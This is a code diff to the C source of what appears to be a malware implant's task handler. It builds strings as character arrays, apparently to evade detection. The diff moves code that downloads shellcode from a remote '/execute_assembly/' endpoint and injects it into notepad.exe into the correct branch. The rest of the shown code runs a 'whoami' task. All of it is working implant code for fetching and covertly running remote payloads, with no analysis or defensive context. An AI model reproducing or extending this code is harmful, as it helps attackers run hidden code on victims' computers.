@@ -375,14 +375,6 @@ void myMain()
         }
         else if (my_strcmp(taskType, whoami) == 0)
         {
-            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
-            DWORD dwShellcodeSize;
-            WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-            LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
-            CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
-            ((PRINTF)api->printf)(hi, dwShellcodeSize);
-            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
-            //CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(orgOutput, '\n');
         }
@@ -412,11 +404,13 @@ void myMain()
         }
         else if (my_strcmp(taskType, executeAssembly) == 0)
         {
-            CHAR lpApplicationName[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
+            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
-            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, lpApplicationName);
+            CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
+            ((PRINTF)api->printf)(hi, dwShellcodeSize);
+            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
             CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
         }
         else
